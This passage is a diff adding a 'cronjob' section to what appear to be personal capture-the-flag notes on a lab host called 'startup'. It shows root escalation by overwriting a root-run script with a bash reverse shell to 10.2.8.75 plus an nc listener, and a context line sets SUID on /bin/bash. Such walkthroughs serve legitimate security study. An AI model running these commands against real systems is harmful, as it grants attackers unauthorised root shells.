@@ -273,3 +273,33 @@ os.system("chmod +s /bin/bash")
 sudo /bin/su
 
 ``````````````
+# 18. cronjob
+planner.sh
+#!/bin/bash
+echo $LIST > /home/lennie/scripts/startup_list.txt
+/etc/print.sh
+
+I upload pspy64 and run it
+
+After letting this process run, I see that planner.sh is run as a cronjob as root
+	2020/11/09 02:03:01 CMD: UID=0    PID=1995   | /bin/bash /home/lennie/scripts/planner.sh
+  
+ Looking at /etc/print.sh I find lennie is allowed to edit this file
+	
+
+lennie@startup:~/scripts$ ls -la /etc/print.sh 
+-rwx------ 1 lennie lennie 25 Nov  8 22:02 /etc/print.sh
+
+use Pentest Monkey Reverse Shell Cheatsheet for an already made reverse shell command, editing only my IP address
+	
+  lennie@startup:~/scripts$ 
+  `````````````````````````````````
+  echo 'bash -c "bash -i >& /dev/tcp/10.2.8.75/8080 0>&1"' > /etc/print.sh
+  nc -lvnp 8080
+  `````````````````````````````````````````````````````````````````````````
+
+
+  
+  
+  
+  
